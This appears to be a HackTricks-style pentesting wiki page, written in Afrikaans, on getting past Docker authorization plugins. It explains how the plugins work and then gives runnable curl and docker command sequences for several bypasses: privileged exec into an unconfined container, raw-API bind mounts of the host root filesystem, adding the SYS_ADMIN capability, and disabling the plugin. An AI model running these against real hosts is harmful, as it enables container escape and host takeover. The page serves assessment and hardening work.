# Runtime Autorisasie-plugins

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime autorisasie-plugins is 'n ekstra beleidlaag wat bepaal of 'n oproeper 'n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. Volgens verstek het enigiemand wat met die Docker daemon kan kommunikeer effektief wye beheer oor dit. Autorisasie-plugins probeer daardie model vernou deur die geverifieerde gebruiker en die aangevraagde API-bewerking te ondersoek, en dan die versoek volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien sy eie bladsy omdat dit die uitbuitingmodel verander wanneer 'n aanvaller reeds toegang het tot 'n Docker API of tot 'n gebruiker in die `docker` group. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "is die daemon omhein deur 'n autorisasielaag, en indien wel, kan daardie laag omseil word deur onbehandelde endpoints, swak JSON-parsing, of plugin-management permissies?"

## Werking

Wanneer 'n versoek die Docker daemon bereik, kan die autorisasiesubsisteem die versoekkonteks aan een of meer geïnstalleerde plugins deurgee. Die plugin sien die geverifieerde gebruikersidentiteit, die versoekdetails, geselekteerde headers, en dele van die versoek- of antwoordliggaam wanneer die inhoudtipe geskik is. Meerdere plugins kan gekoppel word, en toegang word slegs toegestaan as alle plugins die versoek toelaat.

Hierdie model klink sterk, maar sy veiligheid hang volledig af van hoe volledig die beleidskrywer die API verstaan het. 'n Plugin wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos topvlak `Binds` mis, of plugin-administrasie toelaat, kan 'n vals gevoel van beperking skep terwyl dit steeds direkte privilege-escalation paths ooplaat.

## Algemene plugin-teikens

Belangrike areas vir beleidsherziening is:

- endpunte vir container-skepping
- `HostConfig` velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, en namespace-sharing opsies
- gedrag van `docker exec`
- plugin-management endpunte
- enige endpunt wat indirek runtime-aksies kan trigger buite die bedoelde beleidsmodel

Histories het voorbeelde soos Twistlock se `authz` plugin en eenvoudige opvoedkundige plugins soos `authobot` hierdie model maklik gemaak om te bestudeer omdat hul beleidslêers en kodepaaie getoon het hoe endpoint-tot-aksie koppeling werklik geïmplementeer is. Vir assesseringwerk is die belangrike les dat die beleidskrywer die volle API-oppervlak moet verstaan eerder as net die mees sigbare CLI-opdragte.

## Misbruik

Die eerste doel is om te leer wat werklik geblokkeer word. As die daemon 'n aksie weier, die fout dikwels leaks die plugin-naam, wat help om die beheer in gebruik te identifiseer:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Indien jy breër endpoint profiling benodig, is gereedskap soos `docker_auth_profiler` nuttig omdat hulle die andersins herhalende taak outomatiseer om te nagaan watter API routes en JSON structures werklik deur die plugin toegelaat word.

As die omgewing 'n custom plugin gebruik en jy met die API kan interakteer, enumereer watter object fields werklik gefilter word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie authorization failures veldspesifiek is, eerder as konsepspesifiek. 'n plugin mag 'n CLI-patroon verwerp sonder om die ekwivalente API-struktuur ten volle te blokkeer.

### Volledige voorbeeld: `docker exec` Adds Privilege After Container Creation

'n beleid wat privileged container creation blokkeer, maar unconfined container creation plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker 'n bevoorregte interaktiewe proses binne 'n container herstel wat die beleidsskrywer geglo het beperk is.

### Volledige voorbeeld: Bind Mount Through Raw API

Sommige gebroke beleide inspekteer slegs een JSON-vorm. As die root filesystem bind mount nie konsekwent geblokkeer word nie, kan die host steeds gemonteer word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook verskyn onder `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is 'n volledige host filesystem escape. Die interessante detail is dat die omseiling voortkom uit onvolledige policy coverage eerder as uit 'n kernel bug.

### Volledige Voorbeeld: Unchecked Capability Attribute

As die policy vergeet om 'n capability-related attribute te filter, kan die attacker 'n container skep wat 'n gevaarlike capability herwin:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of 'n soortgelyk sterk capability teenwoordig is, word baie breakout techniques wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Om die plugin uit te skakel

As plugin-management-operasies toegelaat word, mag die skoonste bypass wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is 'n beleidsmislukking op die control-plane vlak. Die machtigingslaag bestaan, maar die gebruiker wat dit moes beperk, behou steeds die toestemming om dit uit te skakel.

## Kontroles

Hierdie opdragte is daarop gemik om te bepaal of 'n beleidslaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat hier interessant is:

- Weierboodskappe wat 'n plugin-naam insluit bevestig 'n autorisasie-laag en openbaar dikwels die presiese implementering.
- 'n Plugin-lys wat vir die aanvaller sigbaar is kan genoeg wees om te bepaal of deaktiveer- of herkonfigureer-operasies moontlik is.
- 'n Beleid wat slegs voor die hand liggende CLI-aksies blokkeer maar nie rou API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Runtime-standaarde

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Nie standaard ingeskakel nie | Daemon-toegang is effektief alles-of-niks tensy 'n autorisasie-plugin gekonfigureer is | onvolledige plugin-beleid, swartlyste in plaas van toelaatlyste, toelaat van pluginbestuur, veldvlak-blinde kolle |
| Podman | Nie 'n algemene direkte ekwivalent nie | Podman vertrou gewoonlik meer op Unix-permissies, rootless-uitvoering, en besluite oor API-blootstelling as op Docker-styl authz-plugins | breedweg 'n rootful Podman API blootstel, swak socket-permissies |
| containerd / CRI-O | Ander beheermodel | Hierdie runtimes vertrou gewoonlik op socket-permissies, node-trust-grense, en hoër-laag orchestrator-beheerkontroles in plaas van Docker authz-plugins | monteer die socket in workloads, swak node-lokale vertrouensaanname |
| Kubernetes | Gebruik authn/authz by die API-server en kubelet-lae, nie Docker authz-plugins nie | Cluster RBAC en toelatingskontroles is die hoofbeleidlaag | te ruim RBAC, swak toelatingsbeleid, direkte blootstelling van kubelet of runtime APIs |
